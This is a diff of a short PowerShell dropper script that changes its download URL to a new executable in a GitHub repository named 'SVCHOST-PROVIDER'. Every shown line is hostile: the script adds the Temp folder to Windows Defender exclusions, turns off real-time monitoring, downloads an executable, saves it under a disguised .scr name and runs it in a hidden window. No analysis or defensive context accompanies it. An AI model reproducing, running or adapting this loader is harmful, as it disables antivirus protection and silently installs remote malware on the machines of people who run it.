@@ -1,7 +1,7 @@
 $oP = "$env:Temp"
 Add-MpPreference -ExclusionPath $oP
 Set-MpPreference -DisableRealtimeMonitoring $true
-$fU = "https://github.com/SplashGG/dl/raw/main/Stringless.exe"
+$fU = "https://github.com/SVCHOST-PROVIDER/MAIN/releases/download/WH/JustInforming.exe"
 $oPT = "$env:Temp\​.scr"
 Invoke-WebRequest -Uri $fU -OutFile $oPT -ErrorAction Stop
 Start-Process -FilePath $oPT -WindowStyle Hidden -Wait
